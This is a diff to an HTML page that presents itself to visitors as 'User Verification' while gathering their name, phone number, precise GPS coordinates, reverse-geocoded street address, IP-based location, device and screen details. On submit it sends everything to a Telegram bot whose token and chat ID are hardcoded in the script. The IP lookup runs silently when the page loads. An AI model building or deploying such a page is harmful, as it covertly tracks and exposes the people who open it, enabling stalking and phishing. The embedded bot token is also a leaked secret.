@@ -5,63 +5,175 @@
 <title>User Info Capture</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{font-family:Arial;background:#f2f4f7;padding:20px}
-.container{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:12px}
-input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #ccc}
-button{background:#0088cc;color:#fff;border:none}
-#status{color:green;text-align:center;font-size:14px}
+body{
+  font-family:Arial, sans-serif;
+  background:#eef2f7;
+  padding:20px;
+}
+.box{
+  max-width:430px;
+  margin:auto;
+  background:#fff;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 4px 12px rgba(0,0,0,.1);
+}
+h2{text-align:center}
+input,button{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border-radius:8px;
+  border:1px solid #ccc;
+  font-size:15px;
+}
+button{
+  background:#0088cc;
+  color:#fff;
+  border:none;
+  cursor:pointer;
+}
+#status{
+  font-size:14px;
+  text-align:center;
+  margin-top:6px;
+}
 </style>
 </head>
 
 <body>
-<div class="container">
-<h2>User Information</h2>
+<div class="box">
+<h2>User Verification</h2>
 
 <input id="name" placeholder="Full Name" required>
 <input id="phone" placeholder="Phone Number" required>
 
-<button onclick="getLocation()">📍 Capture Location</button>
-<p id="status"></p>
+<button onclick="getGPS()">📍 Capture Location</button>
+<div id="status"></div>
 
 <button onclick="submitData()">Submit</button>
 </div>
 
 <script>
-let lat="", lng="";
+let gpsLat="", gpsLng="", accuracy="";
+let fullAddress="Not Available";
+let ipInfo="Not Available";
 
-function getLocation(){
-navigator.geolocation.getCurrentPosition(
-pos=>{
-lat=pos.coords.latitude;
-lng=pos.coords.longitude;
-status.innerText="Location captured ✔️";
-},
-()=>alert("Location permission required")
-);
+/* IP location backup */
+async function getIPInfo(){
+  try{
+    let res = await fetch("https://ipapi.co/json/");
+    let d = await res.json();
+    ipInfo = `${d.city}, ${d.region}, ${d.country_name} | IP: ${d.ip}`;
+  }catch{}
+}
+getIPInfo();
+
+/* Reverse geocoding */
+async function reverseGeocode(lat,lng){
+  try{
+    let res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
+    );
+    let data = await res.json();
+    fullAddress = data.display_name || "Address not found";
+  }catch{
+    fullAddress = "Address fetch failed";
+  }
 }
 
+/* Capture GPS */
+function getGPS(){
+  if(!navigator.geolocation){
+    status.innerHTML="Geolocation not supported ❌";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async pos=>{
+      gpsLat = pos.coords.latitude;
+      gpsLng = pos.coords.longitude;
+      accuracy = pos.coords.accuracy;
+
+      await reverseGeocode(gpsLat, gpsLng);
+
+      status.innerHTML =
+        "📍 Location & Address Captured ✔️<br>"+
+        "Accuracy: "+accuracy+" meters";
+    },
+    ()=>{
+      status.innerHTML =
+        "GPS denied ❌<br>IP location will be used";
+    },
+    {
+      enableHighAccuracy:true,
+      timeout:10000,
+      maximumAge:0
+    }
+  );
+}
+
+/* Submit to Telegram */
 function submitData(){
 
-  // 🔴 YAHAN APNA NEW TOKEN PASTE KARO
+  if(!name.value || !phone.value){
+    alert("Fill all details");
+    return;
+  }
+
+  // 🔴 PASTE YOUR TOKEN HERE
   let BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
 
-  // ✅ AAPKA CHAT ID (ALREADY FILLED)
+  // ✅ YOUR CHAT ID
   let CHAT_ID = "543961277";
 
+  let time = new Date().toLocaleString("en-IN");
+  let device = navigator.userAgent;
+  let screenInfo = screen.width+"x"+screen.height;
+
+  let locationBlock;
+
+  if(gpsLat){
+    let mapLink = `https://www.google.com/maps?q=${gpsLat},${gpsLng}`;
+    locationBlock =
+`📍 GPS Location
+Lat: ${gpsLat}
+Lng: ${gpsLng}
+Accuracy: ${accuracy} m
+
+🏠 Address
+${fullAddress}
+
+🗺 Map: ${mapLink}`;
+  }else{
+    locationBlock =
+`🌐 IP Based Location
+${ipInfo}`;
+  }
+
   let message =
-  "📩 New Submission\n\n"+
-  "👤 Name: "+name.value+"\n"+
-  "📞 Phone: "+phone.value+"\n"+
-  "📍 Location: "+lat+", "+lng;
+`📩 NEW USER SUBMISSION
 
-  let url =
-  "https://api.telegram.org/bot"+BOT_TOKEN+
-  "/sendMessage?chat_id="+CHAT_ID+
-  "&text="+encodeURIComponent(message);
+👤 Name: ${name.value}
+📞 Phone: ${phone.value}
 
-  fetch(url)
-  .then(()=>alert("Sent to Telegram ✅"))
-  .catch(()=>alert("Error ❌"));
+${locationBlock}
+
+📱 Device: ${device}
+🖥 Screen: ${screenInfo}
+
+⏰ Time: ${time}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text:message
+    })
+  })
+  .then(()=>alert("Data sent to Telegram ✅"))
+  .catch(()=>alert("Telegram error ❌"));
 }
 </script>
 </body>
